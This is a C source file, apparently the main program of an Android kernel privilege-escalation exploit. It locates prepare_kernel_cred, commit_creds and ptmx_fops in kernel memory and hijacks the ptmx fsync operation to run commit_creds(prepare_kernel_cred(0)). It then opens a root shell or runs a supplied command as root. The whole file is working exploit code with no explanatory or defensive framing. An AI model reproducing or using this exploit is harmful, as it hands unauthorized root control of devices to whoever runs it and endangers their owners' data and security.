#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <sys/system_properties.h>
#include "device_database.h"
#include "cred.h"
#include "mm.h"
#include "ptmx.h"
#include "libexploit/exploit.h"
#include "libkallsyms/kallsyms_in_memory.h"

void
obtain_root_privilege(void)
{
  commit_creds(prepare_kernel_cred(0));
}

static bool
run_obtain_root_privilege(void *user_data)
{
  int fd;
  int ret;

  fd = open(PTMX_DEVICE, O_WRONLY);
  ret = fsync(fd);
  close(fd);

  return (ret == 0);
}

static bool
run_exploit(void)
{
  setup_ptmx_fops_fsync_address();
  if (!ptmx_fops_fsync_address) {
    return false;
  }

  return attempt_exploit(ptmx_fops_fsync_address,
                         (unsigned long int)&obtain_root_privilege, 0,
                         run_obtain_root_privilege, NULL);
}

void
device_detected(void)
{
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  printf("\n\nDevice detected: %s (%s)\n\n", device, build_id);
}

static bool
find_ptmx_fops_address(kallsyms *info, void *mem, size_t length)
{
  find_ptmx_fops_hint_t hint;

  hint.ptmx_open_address = kallsyms_in_memory_lookup_name(info, "ptmx_open");
  if (!hint.ptmx_open_address) {
    return false;
  }

  hint.tty_release_address = kallsyms_in_memory_lookup_name(info, "tty_release");
  if (!hint.tty_release_address) {
    return false;
  }

  hint.tty_fasync_address = kallsyms_in_memory_lookup_name(info, "tty_fasync");
  if (!hint.tty_fasync_address) {
    return false;
  }

  return setup_ptmx_fops_address_in_memory(mem, length, &hint);
}

bool find_variables_in_memory(void *mem, size_t length)
{
  kallsyms *info;

  printf("Search address in memroy...\n");

  info = kallsyms_in_memory_init(mem, length);
  if (info) {
    printf("Using kallsyms_in_memroy...\n");

    if (!prepare_kernel_cred) {
      prepare_kernel_cred = (prepare_kernel_cred_t)kallsyms_in_memory_lookup_name(info, "prepare_kernel_cred");
    }

    if (!commit_creds) {
      commit_creds = (commit_creds_t)kallsyms_in_memory_lookup_name(info, "commit_creds");
    }

    if (!ptmx_fops) {
      ptmx_fops = (void *)kallsyms_in_memory_lookup_name(info, "ptmx_fops");

      if (!ptmx_fops) {
        find_ptmx_fops_address(info, mem, length);
      }
    }

    kallsyms_in_memory_free(info);

    if (prepare_kernel_cred && commit_creds && ptmx_fops) {
      return true;
    }
  }

  setup_prepare_kernel_cred_address_in_memory(mem, length);
  setup_commit_creds_address_in_memory(mem, length);

  return prepare_kernel_cred && commit_creds && ptmx_fops;
}

bool
setup_variables(void)
{
  setup_prepare_kernel_cred_address();
  setup_commit_creds_address();
  setup_ptmx_fops_address();

  if (prepare_kernel_cred && commit_creds && ptmx_fops) {
    return true;
  }

  printf("Try to find address in memory...\n");
  if (!run_with_mmap(find_variables_in_memory)) {
    printf("\n");
    run_with_memcpy(find_variables_in_memory);
  }

  if (prepare_kernel_cred && commit_creds && ptmx_fops) {
    printf("  prepare_kernel_cred = %p\n", prepare_kernel_cred);
    printf("  commit_creds = %p\n", commit_creds);
    printf("  ptmx_fops = %p\n", ptmx_fops);

#ifdef HAS_SET_SYMBOL_ADDRESS
    device_set_symbol_address(DEVICE_SYMBOL(prepare_kernel_cred), (unsigned long int)prepare_kernel_cred);
    device_set_symbol_address(DEVICE_SYMBOL(commit_creds), (unsigned long int)commit_creds);
    device_set_symbol_address(DEVICE_SYMBOL(ptmx_fops), (unsigned long int)ptmx_fops);
#endif /* HAS_SET_SYMBOL_ADDRESS */

    return true;
  }

  if (!prepare_kernel_cred) {
    printf("Failed to get prepare_kernel_cred addresses.\n");
  }

  if (!commit_creds) {
    printf("Failed to get commit_creds addresses.\n");
  }

  if (!ptmx_fops) {
    printf("Failed to get ptmx_fops addresses.\n");
  }

  print_reason_device_not_supported();

  return false;
}

int
main(int argc, char **argv)
{
  char* command = NULL;
  int i;
  for (i = 1; i < argc; i++) {
    if (!strcmp(argv[i], "-c")) {
      if (++i < argc) {
        command = argv[i];
      }
    }
  }

  device_detected();

  if (!setup_variables()) {
    printf("Failed to setup variables.\n");
    exit(EXIT_FAILURE);
  }

  run_exploit();

  if (getuid() != 0) {
    printf("Failed to obtain root privilege.\n");
    exit(EXIT_FAILURE);
  }

  if (command == NULL) {
    system("/system/bin/sh");
  } else {
    execl("/system/bin/sh", "/system/bin/sh", "-c", command, NULL);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
